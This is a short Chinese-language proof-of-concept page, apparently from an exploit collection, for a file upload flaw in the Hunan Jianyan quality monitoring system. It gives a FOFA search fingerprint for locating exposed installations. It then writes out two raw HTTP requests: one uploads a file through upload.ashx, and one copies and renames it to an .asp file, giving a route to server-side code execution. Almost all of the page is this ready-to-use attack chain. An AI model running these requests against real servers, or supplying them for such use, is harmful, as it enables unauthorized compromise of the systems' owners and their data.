## 湖南建研质量监测系统upload.ashx文件上传漏洞

## fofa
```
body="/Content/Theme/Standard/webSite/login.css"
```

## poc
```
POST /Applications/Attachment/upload.ashx HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 335

--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
Content-Disposition: form-data; name="file";filename="123.txt"

123
--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
Content-Disposition: form-data; name="_upload_guid"
123
--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
```

![f846bf63220b1ecd0a62c03c66fb0924](https://github.com/wy876/POC/assets/139549762/e277303f-001d-4fa3-9f2a-a8aac3d65aba)

### 将文件复制改名

```
POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Forwarded-Proto: 
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 63

filename=/tempData/12345667.asp&filetplpath=/tempData/123.txt
```

![271f4e479da4984ce1d40aebe30dfcc2](https://github.com/wy876/POC/assets/139549762/65de9612-4beb-47ef-80e0-c8a34aacf017)
